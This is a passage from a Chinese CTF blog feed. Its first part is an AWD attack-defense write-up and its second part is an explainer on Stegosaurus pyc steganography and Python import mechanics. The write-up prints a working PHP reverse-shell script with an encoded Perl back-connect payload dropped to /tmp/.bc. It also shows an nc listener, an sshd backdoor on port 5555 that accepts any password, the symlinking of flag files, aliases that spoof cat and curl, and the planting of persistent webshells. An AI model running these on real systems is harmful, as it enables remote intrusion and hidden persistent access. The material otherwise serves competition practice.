punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>@<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> @<span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'passthru'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>@<span class="token function">ob_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">passthru</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> @<span class="token function">ob_get_contents</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">ob_end_clean</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span>@<span class="token function">is_resource</span><span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> @<span class="token function">popen</span><span class="token punctuation">(</span><span class="token variable">$cfe</span><span class="token punctuation">,</span> <span class="token double-quoted-string string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token single-quoted-string string">''</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>@<span class="token function">feof</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$res</span> <span class="token punctuation">.</span><span class="token operator">=</span> @<span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">,</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token function">pclose</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function">cf</span><span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">,</span> <span class="token variable">$text</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$fp</span> <span class="token operator">=</span> @<span class="token function">fopen</span><span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">,</span> <span class="token single-quoted-string string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>@<span class="token function">fputs</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">,</span> @<span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$text</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$fp</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$yourip</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"xxx.xxx.xxx.xxx"</span><span class="token punctuation">;</span><span class="token variable">$yourport</span> <span class="token operator">=</span> <span class="token single-quoted-string string">'1024'</span><span class="token punctuation">;</span><span class="token variable">$usedb</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'perl'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'perl'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'c'</span><span class="token operator">=</span><span class="token operator">></span><span class="token single-quoted-string string">'c'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$back_connect</span> <span class="token operator">=</span> <span class="token double-quoted-string string">"IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl"</span><span class="token punctuation">.</span><span class="token double-quoted-string string">"OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw=="</span><span class="token punctuation">;</span><span class="token function">cf</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'/tmp/.bc'</span><span class="token punctuation">,</span><span class="token variable">$back_connect</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token function">which</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'perl'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token double-quoted-string string">" /tmp/.bc <span class="token interpolation"><span class="token variable">$yourip</span></span> <span class="token interpolation"><span class="token variable">$yourport</span></span> &amp;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre><p>使用方法也是很简单，将shell文件上传至可访问的地方<br />开启nc监听</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -l -vv <span class="token punctuation">[</span>port<span class="token punctuation">]</span><span class="token comment">#这里是1024,可以自己设置</span></code></pre><p>然后访问该文件，就成功反弹shell<br />效果如下：<br /><img src="https://gitee.com/m0re/picture/raw/master/img/1608189421672-9dd9c0f1-39cf-4992-a40d-66c1d7bcbef6.png" loading="lazy"><br />然后记个小tip：美化终端，不过还是别花时间做这个了，虽然就一条命令。</p><pre class="language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"import pty; pty.spawn('/bin/bash')"</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/1608189769627-c7a0352d-b5bf-44fd-970e-c8f4d0355c4c.png" loading="lazy"><br />小 Trick: 使用 <code>find / -name *flag*</code> 或 <code>grep -rn &quot;flag&quot; *</code> 类似的语句可以快速发现 flag 所在的地方，方便后续拿分。<br /><img src="https://gitee.com/m0re/picture/raw/master/img/1608189834550-22ff6a18-e6e1-4b99-a92b-69b17baa7557.png" loading="lazy"><br /></p><p><a name="fudf8"></a></p><h3 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h3><p>可以创建个软链接，链接到根目录下flag</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> -s /flag /var/www/html/upload/footer.js</code></pre><p>这个有两种方式，一种是直接使用，在他们还没来得及挂流量监控和文件监控的时候，赶快使用这条命令，直接在可以写入的upload文件夹下创建软链接。写成这样，不会有太多人去怀疑这个点。<br />然后直接cat upload文件夹下的footer.js就可以得到flag<br />也可以直接访问upload/footer.js得到flag如下：<br /><img src="https://gitee.com/m0re/picture/raw/master/img/1608190811019-8cc926af-bbf8-4c3f-b315-8d67ce684a2d.png" loading="lazy"><br />第二种利用方式，批量！！！前提是对方开启监控，怕被删怎么办，就直接批量写，到处写垃圾文件，让他们删不过来。而我们知道这个flag链接的文件是哪个，就可以持续得分。但是，没有尝试，因为自己服务器有点小。<br><a name="B61XS"></a></p><h3 id="ssh免密登录-未尝试"><a href="#ssh免密登录-未尝试" class="headerlink" title="ssh免密登录(未尝试)"></a>ssh免密登录(未尝试)</h3><p>在终端执行此命令，然后可以实现ssh免密登陆</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> -sf /usr/sbin/sshd /tmp/su<span class="token punctuation">;</span> /tmp/su -oPort<span class="token operator">=</span><span class="token number">5555</span><span class="token punctuation">;</span></code></pre><p>连接：ssh <a href="mailto:&#x72;&#111;&#x6f;&#116;&#x40;&#x78;&#x2e;&#x78;&#46;&#120;&#46;&#x78;">&#x72;&#111;&#x6f;&#116;&#x40;&#x78;&#x2e;&#x78;&#46;&#120;&#46;&#x78;</a> -p 5555<br />密码随意。<br><a name="LxbaK"></a></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>alias命令，命令文档。<br /><img src="https://gitee.com/m0re/picture/raw/master/img/1608221091839-a6b23d61-6960-4c00-b931-00d693b9f1d9.png" loading="lazy"><br />怎么说，就是看利用方式<br /><img src="https://gitee.com/m0re/picture/raw/master/img/1608221433870-922803e5-7fa8-4b66-a273-7c8c72c3f065.png" loading="lazy"><br />root权限怎么会没权限？别人进来也无法cat到flag，当然还可以使用其他办法查看。<br />还有就是改定时任务，别人看不了我们的定时任务。可以尝试改别人的。前提是有权限之后。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">crontab</span> -r   <span class="token builtin class-name">alias</span> <span class="token assign-left variable">crontab</span><span class="token operator">=</span><span class="token string">"echo no crontab for <span class="token variable"><span class="token variable">`</span><span class="token function">whoami</span><span class="token variable">`</span></span> ||"</span><span class="token comment">#返回假的flag</span><span class="token builtin class-name">alias</span> <span class="token assign-left variable">cat</span><span class="token operator">=</span><span class="token string">"echo <span class="token variable"><span class="token variable">`</span><span class="token function">date</span><span class="token variable">`</span></span>|md5sum|cut -d ' ' -f1||"</span></code></pre><p><a name="iAF4L"></a></p><h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><p>比赛可能会告诉你其他队伍的IP，也可能不会告诉你，一般在同一个C段或者B段，因此需要首先利用nmap、<a href="https://github.com/zer0h/httpscan">httpscan</a>等扫描工具发现其他队伍的IP。<br />nmap：</p><pre class="language-bash" data-language="bash"><code class="language-bash">nmap –sn <span class="token number">192.168</span>.71.0/24</code></pre><p>httpscan</p><pre class="language-bash" data-language="bash"><code class="language-bash">./httpscan.py <span class="token number">10.20</span>.30.0/24 –t <span class="token number">10</span></code></pre><p><a name="3b1b8f5e"></a></p><h4 id="修改curl命令"><a href="#修改curl命令" class="headerlink" title="修改curl命令"></a>修改curl命令</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">alias</span> <span class="token assign-left variable">curl</span><span class="token operator">=</span><span class="token string">'echo fuckoff'</span> <span class="token comment">#权限要求较低</span><span class="token comment"># 或者</span><span class="token builtin class-name">alias</span> <span class="token assign-left variable">curl</span><span class="token operator">=</span><span class="token string">'python -c "__import__(<span class="token entity" title="\&quot;">\"</span>sys<span class="token entity" title="\&quot;">\"</span>).stdout.write(<span class="token entity" title="\&quot;">\"</span>flag&#123;%s&#125;<span class="token entity" title="\\">\\</span>n<span class="token entity" title="\&quot;">\"</span> % (__import__(<span class="token entity" title="\&quot;">\"</span>hashlib<span class="token entity" title="\&quot;">\"</span>).md5(<span class="token entity" title="\&quot;">\"</span><span class="token entity" title="\&quot;">\"</span>.join([__import__(<span class="token entity" title="\&quot;">\"</span>random<span class="token entity" title="\&quot;">\"</span>).choice(__import__(<span class="token entity" title="\&quot;">\"</span>string<span class="token entity" title="\&quot;">\"</span>).letters) for i in range(0x10)])).hexdigest()))"'</span><span class="token function">chmod</span> -x <span class="token function">curl</span> <span class="token comment">#降权，取消执行权限(权限要求较高)</span></code></pre><p><a name="XjUWL"></a></p><h4 id="关闭不必要端口"><a href="#关闭不必要端口" class="headerlink" title="关闭不必要端口"></a>关闭不必要端口</h4><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">netstat</span> -napt 查看当前网络连接状态<span class="token function">lsof</span> -i 用以显示符合条件的进程情况<span class="token function">lsof</span> -i:22  查看22端口现在运行什么程序<span class="token function">kill</span> -9 <span class="token operator">&lt;</span>PID<span class="token operator">></span>  杀掉进程nmap -sV ip地址<span class="token punctuation">(</span>-sV参数可以探测目标主机的服务器版本<span class="token punctuation">)</span></code></pre><p>批量提交flag的脚本，可以进行百度，找一些脚本自己根据比赛场景进行修改。<br><a name="exweq"></a></p><h1 id="赛后"><a href="#赛后" class="headerlink" title="赛后"></a>赛后</h1><p>吐槽：真的就是赛前疯狂搜集各种脚本姿势。比赛时没有用上多少。emmmmm，怎么说就是感觉没什么可以记录的了。这个比赛已经被喷了，人学校酒店挺好的，住着很舒服。关于比赛的就不再记录了。就记一下学习的内容。<br><a name="h97TS"></a></p><h2 id="赛题复现"><a href="#赛题复现" class="headerlink" title="赛题复现"></a>赛题复现</h2><p>dump下来html源码，使用D盾扫描<br /><img src="https://gitee.com/m0re/picture/raw/master/img/1610021994271-1fb4d774-7a4a-495b-9c8e-af894b58c508.png" loading="lazy"><br />发现后门就立刻上传自己的不死马。然后激活并进行维权。相信百度上能找到很多简单维权的办法。还有搅屎的。比如fock炸弹等……<br />接下来就是Seay源码审计系统，进行代码审计，笔者比较菜，所以就只说怎么做。<br /><img src="https://gitee.com/m0re/picture/raw/master/img/1610029393826-87dcc6e0-bc38-4163-872b-1c3b2f70c2c4.png" loading="lazy"><br />然后根据漏洞进行验证就可以了。<br><a name="NJjwg"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>AWD的话，我是负责攻击，防御交给队友，其实面对新手的小型比赛，重点就是D盾扫描，快速找到后门，然后批量上马，批量上马是有时间改脚本的，这次比赛，过程很懵，我以为不同队伍是C段不同而已，结果是==emmmm，估计是开的docker，服了。<br>如果，批量没实现，就尝试一个个的传马吧。不过最后可能是有几个能拿分的。最重要的一点就是，别被别人骑到自己的马了。emmm，目前我收集到的东西就这么多，比较适合盲目百度而不知道从何下手的新手。请师傅们轻点喷。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AWD </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从Stegosaurus隐写涉及Python模块导入机制详情</title>
      <link href="/posts/451544af/"/>
      <url>/posts/451544af/</url>
      
        <content type="html"><![CDATA[<p><img src="https://p0.ssl.qhimg.com/t0158bf5854a443476d.jpg" alt="m0re" loading="lazy"><br>本文首发安全客！<br><a href="https://www.anquanke.com/post/id/225344">https://www.anquanke.com/post/id/225344</a><br>安全客 - 有思想的安全新媒体</p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>无事就翻翻大师傅们的博客，然后看到了一篇关于<code>Stegosaurus</code>隐写的，然后延伸到<code>Python</code>的<code>import</code>模块导入等部分知识。 于是就了解用了一下。</p><h2 id="什么是Stegosaurus？"><a href="#什么是Stegosaurus？" class="headerlink" title="什么是Stegosaurus？"></a>什么是Stegosaurus？</h2><p><code>Stegosaurus</code>是一个隐写工具，它是通过将<code>payload</code>隐藏在<code>Python</code>的字节码文件中。而且不会改变源代码的运行行为，也不会改变源代码的大小。<br><code>Payload</code> 代码会被分散嵌入到字节码之中，所以类似 <code>strings</code> 这样的代码工具无法查找到实际的 <code>Payload</code> 。 <code>Python</code> 的 <code>dis</code> 模块会返回源文件的字节码，然后我们就可以使用 <code>Stegosaurus</code> 来嵌入 <code>Payload</code> 了。</p><h2 id="简单剖析pyc和简析import导入"><a href="#简单剖析pyc和简析import导入" class="headerlink" title="简单剖析pyc和简析import导入"></a>简单剖析pyc和简析import导入</h2><p><code>pyc</code>文件是<code>python</code>的字节码文件，是二进制文件，就是Python源文件在经过解释器编译后生成的字节码文件。现在实验一下。<br>在<code>linux</code>平台实验。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> m0re <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">cd</span> m0re/</code></pre><p>创建一个py文件，内容</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">print_test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'hello,m0re!'</span><span class="token punctuation">)</span>print_test<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20201209120451.png" alt="m0re" loading="lazy"><br>记得要给执行权限。<br>执行一下，成功执行后，再看目录下文件，到那时没发现<code>pyc</code>文件<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201209120742.png" alt="m0re" loading="lazy"><br>再创建一个文件</p><pre class="language-python" data-language="python"><code class="language-python">vim m0re<span class="token punctuation">.</span>py<span class="token comment">#内容如下:</span><span class="token keyword">import</span> testtest<span class="token punctuation">.</span>print_test<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20201209121054.png" alt="m0re" loading="lazy"><br>执行成功后，发现打印了两行，而且出现了一个文件夹<code>__pycache__</code><br>在执行<code>python3 m0re.py</code>时，第一条命令是<code>import test</code>先导入test模块，一个模块在被导入时，PVM(python虚拟机)会在后台从模块包里面搜索test这个模块。<code>Python</code> 中所有加载到内存的模块都放在 <code>sys.modules </code>(保存了之前import的类库的缓存)<br>搜索过程:</p><ul><li>在当前目录下搜索这个模块</li><li>在环境变量中<code>PYTHONPATH</code>中指定的路径列表依次搜索</li><li>在Python安装路径中搜索</li></ul><p>模块的搜索路径<br><code>sys.path</code>返回导入模块时搜索路径集，是一个list列表</p><pre class="language-python" data-language="python"><code class="language-python">In <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token keyword">import</span> sysIn <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span> sys<span class="token punctuation">.</span>pathOut<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/usr/lib/python38.zip'</span><span class="token punctuation">,</span> <span class="token string">'/usr/lib/python3.8'</span><span class="token punctuation">,</span> <span class="token string">'/usr/lib/python3.8/lib-dynload'</span><span class="token punctuation">,</span> <span class="token string">'/usr/local/lib/python3.8/dist-packages'</span><span class="token punctuation">,</span> <span class="token string">'/root/tools/gaps'</span><span class="token punctuation">,</span> <span class="token string">'/usr/lib/python3/dist-packages'</span><span class="token punctuation">,</span> <span class="token string">'/usr/lib/python3/dist-packages/IPython/extensions'</span><span class="token punctuation">,</span> <span class="token string">'/root/.ipython'</span><span class="token punctuation">]</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20201209174018.png" alt="m0re" loading="lazy"></p><ul><li>从上面列出的目录里依次查找要导入的模块文件</li><li>‘’表示当前路径</li><li>列表中的路径的前后顺序表明了python解释器在搜索模块时的前后顺序。</li></ul><p>添加新模块</p><pre class="language-python" data-language="python"><code class="language-python">sys<span class="token punctuation">.</span>path<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">'/home/python/xxxx'</span><span class="token punctuation">)</span>sys<span class="token punctuation">.</span>path<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'/home/python/xxxx'</span><span class="token punctuation">)</span></code></pre><p>注意：使用<code>sys.path.append()</code>和<code>sys.path.insert()</code>添加的路径会在退出交互式环境或者IDE后自动消失。<br><code>import</code>只能导入模块，不能导入模块中的对象(类、函数、变量等)<code>python</code>不能像<code>Java</code>那样，直接通过import来导入某个对象或者类以及某个函数。</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>swing<span class="token punctuation">.</span></span><span class="token operator">*</span><span class="token punctuation">;</span></code></pre><p><code>python</code>的方法是这样的</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> test <span class="token keyword">import</span> print_test</code></pre><p>在解释器中<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201209123353.png" alt="m0re" loading="lazy"></p><h2 id="Python模块嵌套导入"><a href="#Python模块嵌套导入" class="headerlink" title="Python模块嵌套导入"></a>Python模块嵌套导入</h2><p>然后再来看看嵌套导入<br>这就是套娃了。<br>看栗子</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#m0re.py</span><span class="token keyword">from</span> m1re <span class="token keyword">import</span> m3re<span class="token keyword">class</span> <span class="token class-name">m2re</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span><span class="token comment">#m1re.py</span><span class="token keyword">from</span> m0re <span class="token keyword">import</span> m2re<span class="token keyword">class</span> <span class="token class-name">m3re</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20201209125712.png" alt="m0re" loading="lazy"><br><code>importError</code>,导入失败，这样导入是存在问题的。<br>导入时，先搜索<code>m1re</code>，如果存在，就会获得<code>m1re</code>对应的<code>module</code>对象<code>&lt;module m1re&gt;</code>，从这个<code>module</code>对象的<code>__dict</code>中获取<code>m3re</code>对应的对象。如果不存在就抛出异常。<br>如果<code>m1re</code>不存在，就会新建一个<code>module</code>对象<code>&lt;module m1re&gt;</code>，此时的<code>module</code>对象的<code>__dict__</code>为空。，执行<code>m1re.py</code>中的表达式，填充<code>&lt;module m1re&gt;</code>中<code>__dict__</code>的空白。再从<code>&lt;module m1re&gt;</code>的<code>__dict__</code>中获取<code>m3re</code>的对象。如果不存在则抛出异常。<br>所以这个程序的执行流程为<br>1.执行<code>m0re.py</code>，先执行<code>from m1re import m3re</code><br>没有<code>m1re</code>的模块，所以此刻创建一个新的<code>module</code>，此刻的<code>module</code>为空。然后执行<code>m1re.py</code>填充<code>&lt;module m1re&gt;</code>中<code>__dict__</code>的空白。<br>2.执行<code>m1re.py</code>，先执行<code>from m0re import m2re</code><br>同样的，检查缓存中是否存在<code>&lt;module m0re&gt;</code>，因为<code>m0re.py</code>还正在执行，所以缓存中还没有这个<code>module</code>，同样是要创建新的<code>module</code>，然后就是再次执行<code>m0re.py</code>中的代码<br>3.再次执行<code>m0re.py</code>中的<code>from m1re import m3re</code>，第一步，创建过<code>&lt;module m1re&gt;</code>，所以已经存在了，但是里面还是空的，什么也没有。所以从里面获取不到<code>m3re</code>这个对象，这里就会抛出异常<code>ImportError</code>。<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201209143722.png" alt="m0re" loading="lazy"></p><p>将m0re.py修改一下</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> m1re<span class="token keyword">class</span> <span class="token class-name">m2re</span><span class="token punctuation">:</span>    <span class="token keyword">pass</span></code></pre><p>执行过程中就第三步就是只搜索存在<code>&lt;module m1re&gt;</code>，而不用搜索<code>m3re</code><br><img src="https://gitee.com/m0re/picture/raw/master/img/20201209143941.png" alt="m0re" loading="lazy"><br>执行时就无异常抛出<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201209145515.png" alt="m0re" loading="lazy"></p><h2 id="覆盖导入"><a href="#覆盖导入" class="headerlink" title="覆盖导入"></a>覆盖导入</h2><p>当导入的模块与标准库中的模块重名，在导入时会发生覆盖导入，因为python解释器会首先在当前文件夹下搜索查找模块名。这里用一段代码来解释。创建<code>random.py</code>写入下面内容。</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> random<span class="token keyword">print</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>在导入包时，python解释器在当前目录下找到了<code>math</code>，就直接导入。不会进行下面的搜索。我们知道Python的标准库里面的math模块是存在<code>sqrt</code>方法的。然而，这里运行的话，会报错<code>AttributeError</code><br>提示：模块random中没有方法randint<br>import默认就把本身作为模块导入，那么显然代码中没有randint方法，所以会导致报错；<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201209201341.png" alt="m0re" loading="lazy"><br>经过多次测试，并不是所有的冲突都会出现。<br>比如下面这个例子<code>time.py</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> time<span class="token keyword">print</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>还有<code>math.py</code></p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> math <span class="token keyword">def</span> <span class="token function">square_root</span><span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> math<span class="token punctuation">.</span>sqrt<span class="token punctuation">(</span>number<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>square_root<span class="token punctuation">(</span><span class="token number">1600</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p>这两个例子在网上查阅资料，<del>是无法运行的</del>，我的可以运行。<br>不止这两个，为了找个运行不起来的反例，我也是查阅了好多博客。<br>如果出现错误，解决办法那就是改下文件名，尽量避免命名与python文件内调用的模块重复。</p><h2 id="绝对导入"><a href="#绝对导入" class="headerlink" title="绝对导入"></a>绝对导入</h2><p>无论是相对导入还是绝对导入，都是需要一个参照物的的。而绝对导入的参照物就是项目的根目录。<br>在一个目录中有下面的结构:<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201209211610.png" alt="m0re" loading="lazy"><br>以m0re作为根目录，如上图<br>其中，<code>module2.py</code>中有一个<code>function1</code>函数，<code>dir2</code>的<code>__init__.py</code>中有一个<code>class1</code>的类，<code>dir2</code>下的<code>dir3</code>中的<code>module5.py</code>中有一个<code>function3</code>函数。<br>使用绝对路径导入示例: </p><pre class="language-bash" data-language="bash"><code class="language-bash">from dir1 <span class="token function">import</span> module1from dir1.module2 <span class="token function">import</span> function1from dir2 <span class="token function">import</span> class1from dir2.dir3.module5 <span class="token function">import</span> function2</code></pre><p>绝对路径要求我们必须从最顶层的文件夹开始，为每个包或每个模块提供出完整详细的导入路径。<br>现在的<code>python3.x</code>中，绝对导入是默认的导入形式。它的优点是很明显的知道要导入的包或者模块在什么位置。<br>那么问题来了，如果导入包的话，顺序是什么？<br>这里重新构造一个目录如下<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201210145207.png" alt="m0re" loading="lazy"><br>m0re.py、module1.py、module2.py都写入以下内容</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">pass</span></code></pre><p><code>__init__.py</code>写入<br><code>print(&#39;hello,world&#39;)</code><br>一般的执行过程：<br>通常情况下，首先从根目录开始导入，所以第一步是写个<code>test.py</code>文件导入模块</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> dir1<span class="token punctuation">.</span>m0re<span class="token keyword">import</span> dir1<span class="token punctuation">.</span>dir2<span class="token keyword">import</span> dir1<span class="token punctuation">.</span>dir2<span class="token punctuation">.</span>module1 <span class="token keyword">as</span> m1<span class="token keyword">import</span> dir1<span class="token punctuation">.</span>dir3<span class="token punctuation">.</span>module2dir1<span class="token punctuation">.</span>m0re<span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span>m1<span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span>dir1<span class="token punctuation">.</span>dir3<span class="token punctuation">.</span>module2<span class="token punctuation">.</span>getName<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>执行结果：<br><img src="https://gitee.com/m0re/picture/raw/master/img/20201210145555.png" alt="m0re" loading="lazy"><br>先导入<code>m0re</code>，然后<code>sys.module</code>会创建<code>dir1</code>和<code>dir1.m0re</code>两个模块，然后<code>m0re.py</code>中的函数就可以调用了。但是<code>dir2</code>中的函数不能调用，因为只是存在<code>dir1</code>这个模块，模块中关于<code>dir2</code>的内容还是空的。<br>执行<code>import dir1.dir2</code>后就可调用<code>dir2</code>中的函数了，此时的<code>dir2</code>算是被载入内存中了。<br><code>as</code> 